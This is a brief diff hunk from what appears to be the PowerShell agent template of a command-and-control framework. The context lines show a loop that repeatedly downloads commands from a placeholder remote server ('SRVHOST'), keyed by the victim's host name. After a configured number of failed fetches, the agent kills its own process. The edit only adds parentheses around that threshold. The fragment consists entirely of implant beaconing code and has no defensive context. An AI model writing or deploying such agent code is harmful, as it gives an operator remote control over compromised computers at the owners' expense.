@@ -90,7 +90,7 @@ while($true){
     $command_raw = $wc2.downloadString("OCU_PROTO://SRVHOST/OCT_command/$fhstname");
     }catch{
     $failure_counter=$failure_counter +1;
-    if ($failure_counter -eq OCT_AKILL){
+    if ($failure_counter -eq (OCT_AKILL)){
     kill $pid
     }
     }
